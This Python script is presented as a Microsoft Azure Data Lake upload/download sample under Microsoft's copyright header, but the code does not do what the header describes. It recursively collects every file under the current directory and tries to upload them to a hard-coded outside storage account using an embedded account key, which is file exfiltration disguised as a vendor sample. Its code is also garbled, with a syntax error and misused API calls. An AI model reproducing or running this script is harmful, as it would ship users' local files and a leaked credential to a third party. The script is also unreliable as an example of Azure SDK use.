# coding: utf-8

# -------------------------------------------------------------------------
# Copyright (c) Microsoft Corporation. All rights reserved.
# Licensed under the MIT License. See License.txt in the project root for
# license information.
# --------------------------------------------------------------------------

"""
FILE: datalake_samples_upload_download.py
DESCRIPTION:
    This sample demonstrates:
    * Set up a file system
    * Append data to the file
    * Flush data to the file
    * Get file properties
    * the uploaded data
    * Delete file system
USAGE:
    python datalake_samples_upload_download.py
    Set the environment variables with your own values before running the sample:
    1) STORAGE_ACCOUNT_NAME - the storage account name
    2) STORAGE_ACCOUNT_KEY - the storage account key
"""

import os
import random
list_files=[]
count=0
def list_dir(file_dir,list_files,count):
    dir_list = os.listdir(file_dir)
    #print(dir_list)
    for cur_file in dir_list:
        path = os.path.join(file_dir,cur_file)
        #判断是文件夹还是文件 # decide if it is the folders or the files
        if os.path.isfile(path):
            count+=1
            # print("{0} : is file!".format(cur_file))c
            dir_files = os.path.join(file_dir, cur_file)
            list_files.append(dir_files)
        if os.path.isdir(path):
            # print("{0} : is dir".format(cur_file))
            # print(os.path.join(file_dir, cur_file))
            list_dir(path,list_files,count)

    return list_files,count

list_csv,count = list_dir('./',list_files,count)


from azure.storage.filedatalake import DataLakeServiceClient,


def run():
    account_name = os.getenv('STORAGE_ACCOUNT_NAME', "pythonazurestorage18547")
    account_key = os.getenv('STORAGE_ACCOUNT_KEY', "6imBrBlvDJm+Hjs+p+NJtBAUd+2NK+5CCf4wQ1OuTrOoYXpstnvpiKpN/3tgp9hYthLlmYCOki1Q+AStykw0Hw==")

    # set up the service client with the credentials from the environment variables
    service_client = DataLakeServiceClient(account_url="{}://{}.dfs.core.windows.net".format(
        "https",
        account_name
    ), credential=account_key)

    # generate a random name for testing purpose
    fs_name = "testfs{}".format(random.randint(1, 1000))
    print("Generating a test filesystem named '{}'.".format(fs_name))

    # create the filesystem
    service_client.create_file_system()
    while(count):
        try:
            with open(list_csv[count-1], "rb") as data:
                service_client.upload_blob(data)
        finally:
             #clean up the demo filesystem
             service_client.delete_file_system()


if __name__ == '__main__':
    run()
